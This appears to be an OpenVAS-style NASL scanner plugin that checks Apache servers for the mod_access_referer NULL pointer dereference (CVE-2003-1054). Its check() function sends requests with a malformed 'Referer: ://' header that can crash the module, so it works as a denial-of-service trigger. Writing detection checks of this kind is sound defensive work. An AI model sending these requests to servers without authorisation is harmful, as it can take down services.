# SPDX-FileCopyrightText: 2003 Xue Yong Zhi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:http_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11543");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-1054");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/7375");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Apache HTTP Server 'mod_access_referer' 1.0.2 NULL Pointer Dereference Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2003 Xue Yong Zhi");
  script_family("Denial of Service");
  script_dependencies("gb_apache_http_server_consolidation.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("apache/http_server/http/detected");

  script_tag(name:"summary", value:"Apache HTTP Server running the 'mod_access_referer'
  module contains a NULL pointer dereference bug.");

  script_tag(name:"impact", value:"Abuse of this vulnerability can possibly be used
  in denial of service attackers against affected systems.");

  script_tag(name:"solution", value:"Try another access control module, mod_access_referer
  has not been updated for a long time.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("host_details.inc");

function check(req, port) {
  #As you see, the Referer part is malformed.
  #And it depends on configuration too -- there must be an IP
  #addresses based access list for mod_access_referer.

  soc = http_open_socket(port);
  if(!soc)
    return(0);

  vt_strings = get_vt_strings();
  referrer = "www." + vt_strings["lowercase"] + ".net";
  req = http_get(item:req, port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nReferer: ://", referrer, "\r\n\r\n"), idx);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  close(soc);
  if("HTTP">< r)
    return(0);

  security_message(port:port);
  exit(0);
}

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

# first to make sure it's a working webserver

req = http_get(item:"/", port:port);
idx = stridx(req, string("\r\n\r\n"));
req = insstr(req, string("\r\nReferer: http://", referrer, "\r\n\r\n"), idx);
r = http_keepalive_send_recv(port:port, data:req);
if(! r || "HTTP" >!< r)
  exit(0);

# We do not know which dir is under control of the
# mod_access_reeferer, just try some...
foreach dir(make_list_unique(http_cgi_dirs(port:port), "/")) {
  if(dir && check(req:dir, port:port))
    exit(0);
}

exit(99);